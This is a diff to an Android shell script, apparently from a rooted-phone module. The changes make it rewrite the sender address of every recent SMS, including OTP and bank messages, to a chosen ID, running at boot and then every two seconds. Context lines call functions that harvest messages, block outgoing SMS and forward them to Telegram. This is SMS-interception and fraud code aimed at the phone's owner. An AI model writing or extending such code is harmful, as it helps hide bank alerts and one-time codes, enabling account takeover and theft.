@@ -1235,6 +1235,9 @@ rewrite_inbox_sender_id() {
   if [ -z "$sid" ]; then
     sid=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$RUNTIME" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
   fi
+  if [ -z "$sid" ] && [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
+    sid=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_ui_save.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+  fi
   [ -z "$sid" ] || [ "$sid" = "AD-TEST-S" ] && return 0
 
   # Persist for Zygisk hooks
@@ -1243,27 +1246,40 @@ rewrite_inbox_sender_id() {
   chmod 666 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null
 
   local out="/data/local/tmp/hivirtus_inbox_query.txt"
+  rm -f "$out"
   content query --uri content://sms/inbox --projection _id:address:date:body \
-    --sort "date DESC" 2>/dev/null | head -n 60 > "$out" || return 0
+    --sort "date DESC" 2>/dev/null | head -n 80 > "$out" || true
+  [ -s "$out" ] || return 0
 
-  local now_ms id addr date digits
+  local now_ms id addr date
   now_ms=$(date +%s)000
+  local changed=0
   while IFS= read -r line; do
     id=$(echo "$line" | sed -n 's/.*_id=\([0-9]*\).*/\1/p')
-    addr=$(echo "$line" | sed -n 's/.*address=\([^,]*\).*/\1/p' | sed 's/[[:space:]]*$//')
+    [ -z "$id" ] && id=$(echo "$line" | sed -n 's/.*_id=\([0-9]*\).*/\1/p')
+    addr=$(echo "$line" | sed -n 's/.*address=\([^,]*\).*/\1/p' | sed 's/[[:space:]]*$//;s/^[[:space:]]*//')
     date=$(echo "$line" | sed -n 's/.*date=\([0-9]*\).*/\1/p')
     [ -z "$id" ] || [ -z "$addr" ] && continue
     [ "$addr" = "$sid" ] && continue
-    # Recent ~30 min (SMSTweaks window for OTP verify)
-    if [ -n "$date" ] && [ "$date" -lt $((now_ms - 1800000)) ] 2>/dev/null; then
+    # Recent ~45 min — OTP / bank SMS window
+    if [ -n "$date" ] && [ "$date" -lt $((now_ms - 2700000)) ] 2>/dev/null; then
       continue
     fi
-    # SMSTweaks: koi bhi incoming (+91 / bank header / shortcode) → saved Sender ID
-    content update --uri content://sms/inbox \
-      --bind address:s:"$sid" \
-      --where "_id=$id" >/dev/null 2>&1 || true
+    # Menu Sender ID force — personal/bank/shortcode sab
+    if content update --uri content://sms/inbox \
+         --bind address:s:"$sid" \
+         --where "_id=$id" >/dev/null 2>&1; then
+      changed=1
+    fi
   done < "$out"
+  if [ "$changed" = "1" ]; then
+    echo "sender_rewrite_ok sid=$sid $(date +%s)" >> /data/local/tmp/hivirtus_sender_rewrite.log 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_sender_rewrite.log 2>/dev/null
+  fi
 }
+
+# Boot once — pehle se stuck inbox bhi Sender ID pe
+rewrite_inbox_sender_id
 
 (
   # Ultra-fast TG path — Hero token ~30s; target Telegram <1s
@@ -1281,9 +1297,18 @@ rewrite_inbox_sender_id() {
     harvest_isms_trace
     harvest_blocked_outgoing
     forward_blocked_telegram
+    rewrite_inbox_sender_id
     enforce_sms_block
     hivirtus_tg_watchdog 2>/dev/null
     sleep 1
+  done
+) &
+
+(
+  # Fast Sender ID rewrite — OTP aate hi menu wali ID pe dikhe
+  while true; do
+    rewrite_inbox_sender_id
+    sleep 2
   done
 ) &
 
